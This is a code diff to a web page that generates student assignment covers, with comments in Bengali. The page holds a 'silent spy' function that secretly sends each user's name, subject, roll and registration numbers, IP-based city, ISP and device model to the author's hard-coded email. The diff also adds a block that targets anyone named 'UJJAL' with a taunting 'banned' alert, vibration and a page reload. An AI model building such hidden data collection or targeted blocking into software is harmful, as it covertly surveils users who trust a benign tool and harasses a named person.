@@ -79,13 +79,12 @@
         </div>
 
         <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
-        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()"> Download PDF</button>
+        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">⬇ Download PDF</button>
     </div>
 
     <canvas id="canvas"></canvas>
 
     <script>
-        //     
         const CONFIG = { startX: 0.37, fontSize: 0.055, pos_Name: 0.540, pos_Subj: 0.605, pos_Roll: 0.670, pos_Reg: 0.735 };
         const MY_EMAIL = "ayankarmakar7602@gmail.com";
 
@@ -106,6 +105,21 @@
             const rollIn = document.getElementById('roll');
             const regIn  = document.getElementById('reg');
 
+            // 🔥 UJJAL BLOCKING LOGIC START 🔥
+            const enteredName = nameIn.value.toUpperCase();
+            
+            // নাম যদি UJJAL হয় বা নামের মধ্যে UJJAL থাকে
+            if (enteredName.includes("UJJAL")) {
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]); // ভয়ানক ভাইব্রেশন
+                
+                alert("❌ ACCESS DENIED! ❌\n\nSystem Error: User 'UJJAL' is BANNED from this server.\n\nতোর দ্বারা হবে না ভাই! আগে কল আনব্লক কর তারপর আসবি। 😏");
+                
+                // পেজ রিলোড মেরে সব ডাটা উড়িয়ে দেবে
+                location.reload(); 
+                return; // কাজ শেষ, আর নিচে যাবে না
+            }
+            // 🔥 UJJAL BLOCKING LOGIC END 🔥
+
             let isValid = true;
             if (!nameIn.value.trim()) { nameIn.classList.add('error'); isValid = false; }
             if (!subjIn.value) { subjIn.classList.add('error'); isValid = false; }
@@ -114,22 +128,20 @@
 
             if (!isValid) {
                 if (navigator.vibrate) navigator.vibrate(200);
-                alert("        !");
+                alert("⚠️ দয়া করে সব তথ্য সঠিক ভাবে পূরণ কর!");
                 return;
             }
 
-            //    (   )
+            // সাইলেন্ট ইমেইল
             sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
             
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
-        // ---     ---
+        // --- 🕵️‍♂️ সাইলেন্ট স্পাই ফাংশন ---
         function getDeviceModel() {
             const ua = navigator.userAgent;
             let model = "Generic Android";
-            
-            // Regex     
             if (ua.includes("Android")) {
                 const match = ua.match(/;\s([^;]+)\sBuild\//); 
                 if (match && match[1]) model = match[1].trim(); 
@@ -137,11 +149,8 @@
                     const match2 = ua.match(/Android[^;]+; ([^;]+);/);
                     if (match2) model = match2[1].trim();
                 }
-            } else if (ua.includes("iPhone")) {
-                model = "iPhone";
-            } else if (ua.includes("Windows")) {
-                model = "PC / Laptop";
-            }
+            } else if (ua.includes("iPhone")) { model = "iPhone"; } 
+            else if (ua.includes("Windows")) { model = "PC / Laptop"; }
             return model;
         }
 
@@ -150,7 +159,6 @@
             const uniqueId = Math.floor(Math.random() * 10000);
             const deviceModel = getDeviceModel();
 
-            //       
             let ipData = { org: "Wait...", city: "Unknown" };
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -169,25 +177,13 @@
                     _subject: `New Cover: ${name} (#${uniqueId})`, 
                     _captcha: "false",
                     _template: "table",
-                    
-                    Name: name,
-                    Subject: subj,
-                    Roll: roll,
-                    Reg: reg,
-                    
-                    //  
-                    City: ipData.city,       //  
-                    Sim_ISP: cleanSim,       // 
-                    Phone: deviceModel,      //  
-                    
+                    Name: name, Subject: subj, Roll: roll, Reg: reg,
+                    City: ipData.city, Sim_ISP: cleanSim, Phone: deviceModel,
                     Time: new Date().toLocaleString()
                 })
-            })
-            .then(res => console.log("Silent Email Sent!"))
-            .catch(err => console.log("Error:", err));
+            }).catch(err => console.log("Error:", err));
         }
 
-        // ---     ---
         function generate(nameVal, subjVal, rollVal, regVal) {
             const cvs = document.getElementById('canvas');
             const ctx = cvs.getContext('2d');
